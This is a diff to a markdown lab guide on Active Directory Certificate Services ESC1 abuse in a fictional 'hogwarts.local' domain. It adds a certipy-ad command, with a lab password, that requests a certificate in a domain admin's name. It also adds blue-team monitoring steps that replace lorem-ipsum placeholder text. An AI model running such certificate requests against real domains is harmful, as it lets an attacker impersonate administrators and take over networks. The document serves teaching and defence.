@@ -126,11 +126,26 @@ HOGWARTS\severus.snape is a domain admin. <br>
 
 <img src="https://github.com/user-attachments/assets/c7572d8e-f948-4302-baa3-849486559f95">
 
+### Step2-Request a Certificated Issued to Domain Admin
+
+```console
+# certipy-ad req -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip 192.168.0.111 -ca 'hogwarts-CERT01-CA' -template 'ESC1_Template' -upn 'severus.snape@hogwarts.local' -target CERT01.hogwarts.local -debug
+```
+<b>-ca</b>         : Specify CA.<br>
+<b>-template</b>   : Specify template name. <br>
+<b>-upn</b>        : Set UPN. This UPN will be included in the issued certificate. It allows impersonating <b>HOGWARTS\severus.snape</b> <br>
+<b>-target</b>     : DNS name of the CA. <br>
 
 ## Blue Team Approach
 
-1500'lü yıllarda, bir matbaacı Cicero'nun bu metnini alarak baskı örneklerinin yer aldığı bir sayfa yaptı. O günden beri, Latince'ye benzeyen bu metin matbaacılıkta sahte bir standart metin olarak kullanılmaktadır. Elektronik yayımcılıktan önce, grafik tasarımcıların metni gösteren kıvrımlı çizgilerle desenler oluşturmaları gerekiyordu. "Lorem ipsum" metni basılan yapışkan sayfalarda, metnin nereye gireceği açıkça görülüyordu.
-Anlamlı bir metin gibi görünen bu ifade, yazı tiplerini göstermek amacıyla matbaacılar tarafından birkaç yüzyıldır kullanılmaktadır. İçerdiği harfler ve bu birleşimlerin harf aralıkları, yazı tipinin ağırlığını, tasarımını ve diğer önemli özelliklerini açıkça gösterdiği için tercih edilmektedir.
+### Monitoring
+
+<b></b>Enable Audit Certification Services with GPO.</b>
+Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Object Access > Audit Certification Services.
+
+<b></b>Enable Audit Kerberos Authentication Service and Audit Kerberos Service Ticket Operations</b>
+Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Account Logon
+
 
 ## Mitigations and Best Practices
 
